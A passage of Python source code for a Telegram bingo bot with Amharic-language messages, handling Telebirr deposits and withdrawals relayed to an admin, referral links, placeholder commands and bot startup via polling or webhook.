        f"ሰርዝ: ሂደቱን ለማቋረጥ /cancel ይጠቀሙ።"
    )
    
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    return GET_DEPOSIT_CONFIRMATION

async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the user's receipt and notifies the admin. (Amharic: ደረሰኝን ለአስተዳዳሪ ያስተላልፋል)"""
    user = update.effective_user
    user_id = user.id
    username = user.username or user.first_name
    
    if not ADMIN_USER_ID:
        await update.message.reply_text("❌ የአስተዳዳሪ ID አልተዋቀረም፣ የማረጋገጫ ሂደቱ ሊጠናቀቅ አይችልም። እባክዎ ቆይተው ይሞክሩ።")
        return ConversationHandler.END
    
    admin_notification_base = (
        f"🚨 አዲስ የተቀማጭ ገንዘብ ጥያቄ (Deposit Request) 🚨\n\n"
        f"👤 የተጠቃሚ ስም: @{username}\n"
        f"ID: {user_id}\n\n"
    )

    if update.message.photo or update.message.document or update.message.text:
        caption_suffix = f"እርምጃ: ሒሳብዎን አረጋግጠው በሚከተለው ትዕዛዝ ገንዘቡን ይጨምሩ:\n`/ap_dep {user_id} [መጠን]`"

        if update.message.photo:
            caption = admin_notification_base + "✅ የተላከ ደረሰኝ: ፎቶ\n" + caption_suffix
            photo_file_id = update.message.photo[-1].file_id 
            try:
                await context.bot.send_photo(ADMIN_USER_ID, photo_file_id, caption=caption, parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Failed to send photo receipt to admin: {e}")
            
        elif update.message.document:
            caption = admin_notification_base + "✅ የተላከ ደረሰኝ: ሰነድ/ፋይል\n" + caption_suffix
            document_file_id = update.message.document.file_id
            try:
                await context.bot.send_document(ADMIN_USER_ID, document_file_id, caption=caption, parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Failed to send document receipt to admin: {e}")

        elif update.message.text:
            confirmation_text = update.message.text
            admin_notification = admin_notification_base + (
                f"📬 የማረጋገጫ መልእክት:\n`{confirmation_text}`\n\n" + caption_suffix
            )
            try:
                await context.bot.send_message(ADMIN_USER_ID, admin_notification, parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Failed to send text confirmation to admin: {e}")
                
        # Send confirmation to user
        user_confirmation = (
            "✅ የማረጋገጫ መልእክት/ደረሰኝዎ ተልኳል!\n\n"
            "አስተዳዳሪው ደረሰኝዎን እየተመለከተ ነው። በቅርቡ ሒሳብዎ ላይ ገቢ ይደረጋል።\n\n"
            "ሒሳብዎን ለመፈተሽ: /balance"
        )
        await update.message.reply_text(user_confirmation, parse_mode='Markdown')
        return ConversationHandler.END
            
    else:
        await update.message.reply_text("❌ እባክዎ የቴሌብር ደረሰኝ ፎቶ፣ ሰነድ ወይም የማረጋገጫ መልእክት ብቻ ይላኩ።")
        return GET_DEPOSIT_CONFIRMATION 

async def cancel_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels the deposit process. (Amharic: ማስገቢያውን ይሰርዛል)"""
    await update.message.reply_text("የማስገቢያው ሂደት ተሰርዟል።")
    return ConversationHandler.END

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Initiates the withdrawal conversation. (Amharic: ገንዘብ ማውጣትን ይጀምራል)"""
    user_id = update.effective_user.id
    bal = (await get_user_data(user_id)).get('balance', 0.00) 
    
    if bal < MIN_WITHDRAW:
        msg = (
            f"❌ ገንዘብ ማውጣት አልተቻለም\n"
            f"የእርስዎ ወቅታዊ ቀሪ ሒሳብ: {bal:.2f} ብር\n"
            f"ዝቅተኛው የማንሳት መጠን (Minimum Withdrawal): {MIN_WITHDRAW:.2f} ብር ነው::"
        )
        await update.message.reply_text(msg, parse_mode='Markdown')
        return ConversationHandler.END

    msg = (
        f"💵 ገንዘብ ለማንሳት (/withdraw)\n\n"
        f"የእርስዎ ወቅታዊ ቀሪ ሒሳብ: {bal:.2f} ብር\n"
        f"ዝቅተኛው የማንሳት መጠን: {MIN_WITHDRAW:.2f} ብር\n\n"
        f"ለማንሳት የሚፈልጉትን የብር መጠን ያስገቡ (ለምሳሌ: 120):\n\nሰርዝ: ሂደቱን ለማቋረጥ /cancel ይጠቀሙ።"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')
    return GET_WITHDRAW_AMOUNT

async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives and validates the withdrawal amount. (Amharic: የማውጣት መጠንን ይቀበላል)"""
    try:
        amount = float(update.message.text.strip())
        user_id = update.effective_user.id
        bal = (await get_user_data(user_id)).get('balance', 0.00) 
        
        if amount < MIN_WITHDRAW:
            await update.message.reply_text(f"❌ ትክክለኛ ያልሆነ መጠን። ከ {MIN_WITHDRAW:.2f} ብር ያላነሰ መጠን ያስገቡ:")
            return GET_WITHDRAW_AMOUNT
        
        if amount > bal:
             await update.message.reply_text(f"❌ በቂ ቀሪ ሒሳብ የለዎትም። ከ {bal:.2f} ብር ያልበለጠ መጠን ያስገቡ:")
             return GET_WITHDRAW_AMOUNT
             
        context.user_data['withdraw_amount'] = amount
        
        msg = "✅ የማንሳት መጠን ተመዝግቧል።\n\nእባክዎ ገንዘቡ እንዲላክልዎ የሚፈልጉትን የቴሌብር አካውንት ቁጥር ያስገቡ:"
        await update.message.reply_text(msg, parse_mode='Markdown')
        return GET_TELEBIRR_ACCOUNT
        
    except ValueError:
        await update.message.reply_text("❌ ትክክለኛ የብር መጠን አላስገቡም። በድጋሚ ይሞክሩ:")
        return GET_WITHDRAW_AMOUNT

async def get_telebirr_account(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives the Telebirr account and notifies the admin. (Amharic: ቴሌብር ቁጥርን ይቀበላል)"""
    telebirr_account = update.message.text.strip()
    amount = context.user_data['withdraw_amount']
    user_id = update.effective_user.id
    
    # Deduct the amount immediately
    update_balance(user_id, -amount, transaction_type='Withdrawal Request', description=f"Telebirr {telebirr_account}")
    
    # Prepare and send message to admin
    admin_message = (
        f"🚨 አዲስ ገንዘብ ማውጣት ጥያቄ (Withdrawal Request) 🚨\n\n"
        f"👤 የተጠቃሚ ID: {user_id}\n"
        f"💰 ለማንሳት የሚፈለገው መጠን: {amount:.2f} ብር\n"
        f"📞 የቴሌብር አካውንት: {telebirr_account}\n\n"
        f"እርምጃ: እባክዎ ገንዘቡን ወደዚህ ቁጥር ይላኩና የዚህን ተጠቃሚ ሂሳብ ያረጋግጡ።"
    )
    
    if ADMIN_USER_ID:
        try:
            await context.bot.send_message(ADMIN_USER_ID, admin_message, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Failed to notify admin of withdrawal: {e}")
            
    # Confirmation to user
    user_confirmation = (
        f"✅ ጥያቄዎ ተልኳል!\n\n"
        f"የተጠየቀው መጠን: {amount:.2f} ብር\n"
        f"የሚላክበት ቁጥር: {telebirr_account}\n\n"
        f"አስተዳዳሪው በቅርቡ ያረጋግጣል እና ገንዘቡን ይልካል።"
    )
    await update.message.reply_text(user_confirmation, parse_mode='Markdown')
    
    context.user_data.clear()
    return ConversationHandler.END

async def cancel_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels the withdrawal process. (Amharic: ገንዘብ ማውጣትን ይሰርዛል)"""
    await update.message.reply_text("የገንዘብ ማውጣት ጥያቄ ተሰርዟል።")
    context.user_data.clear()
    return ConversationHandler.END

# --- Referral Handler ---
async def refer_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Generates and sends the referral link. (Amharic: የሪፈራል ሊንክ)"""
    user_id = update.effective_user.id
    bot_username = (await context.bot.get_me()).username
    
    referral_link = f"https://t.me/{bot_username}?start={user_id}"
    
    msg = (
        f"🔗 ጓደኛ ይጋብዙና {REFERRAL_BONUS:.2f} ብር ያግኙ! (/refer)\n\n"
        f"ይህን ሊንክ በመጠቀም ጓደኛዎን ወደ አዲስ ቢንጎ ይጋብዙ።\n"
        f"ጓደኛዎ ተመዝግቦ የመጀመሪያውን ጨዋታ ሲጫወት፣ እርስዎ ወዲያውኑ {REFERRAL_BONUS:.2f} ብር ያገኛሉ።\n\n"
        f"የእርስዎ መጋበዣ ሊንክ:\n"
        f"`{referral_link}`"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')
    
# --- Placeholder Commands ---
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("📊 የስታቲስቲክስ መረጃ ገና አልተተገበረም።")

async def rank_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("👑 የደረጃ መረጃ ገና አልተተገበረም።")
    
async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("📜 የጨዋታ ታሪክ ገና አልተተገበረም።")
    
async def rules_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("📚 የጨዋታ ህጎች ገና አልተተገበሩም።")

# --- 6. Main Function ---

def main():
    """Starts the bot. (Amharic: ቦቱን ይጀምራል)"""
    if not TOKEN or TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        logger.error("FATAL: TELEGRAM_TOKEN environment variable not set or default value used.")
        return

    # Set up application
    app = Application.builder().token(TOKEN).build()
    
    # --- 1. Conversation Handlers ---
    
    # A. PLAY Command Conversation Handler
    play_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("play", play_command)],
        states={
            GET_CARD_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card_selection)],
        },
        fallbacks=[CommandHandler('cancel', cancel_play)],
    )
    app.add_handler(play_conv_handler)

    # B. WITHDRAW Conversation Handler
    withdraw_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("withdraw", withdraw_command)], 
        states={
            GET_WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_withdraw_amount)],
            GET_TELEBIRR_ACCOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_telebirr_account)],
        },
        fallbacks=[CommandHandler('cancel', cancel_withdraw)],
    )
    app.add_handler(withdraw_conv_handler)
    
    # C. DEPOSIT Conversation Handler
    deposit_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("deposit", deposit_command_initial)],
        states={
            GET_DEPOSIT_CONFIRMATION: [MessageHandler(filters.ALL & ~filters.COMMAND, handle_deposit_confirmation)],
        },
        fallbacks=[CommandHandler('cancel', cancel_deposit)],
        allow_reentry=True 
    )
    app.add_handler(deposit_conv_handler)
    
    # --- 2. Simple Command Handlers ---
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("quickplay", quickplay_command)) 
    app.add_handler(CommandHandler("balance", balance_command)) 
    app.add_handler(CommandHandler("refer", refer_command))
    
    app.add_handler(CommandHandler("stats", stats_command)) 
    app.add_handler(CommandHandler("rank", rank_command))  
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("rules", rules_command)) 
    
    # Admin commands
    app.add_handler(CommandHandler("ap_dep", ap_dep)) 
    app.add_handler(CommandHandler("ap_bal", ap_bal)) 
    app.add_handler(CommandHandler("ap_bal_check", ap_bal_check)) 

    # --- 3. Callback Query Handler (for button interactions) ---
    app.add_handler(CallbackQueryHandler(handle_callback, pattern='^(MARK|BINGO)'))
    app.add_handler(CallbackQueryHandler(start_deposit_conversation, pattern='^START_DEPOSIT_FLOW$'))


    # --- 4. Start the Bot (Polling or Webhook) ---
    PORT = int(os.environ.get('PORT', '8080'))
    if RENDER_EXTERNAL_URL:
        logger.info(f"Running via webhook at {RENDER_EXTERNAL_URL}/{TOKEN}")
        app.run_webhook(listen="0.0.0.0", port=PORT, url_path=TOKEN, webhook_url=f'{RENDER_EXTERNAL_URL}/{TOKEN}')
    else:
        logger.info("Running via long polling.")
        app.run_polling(poll_interval=1.0)

if __name__ == '__main__':
    main()
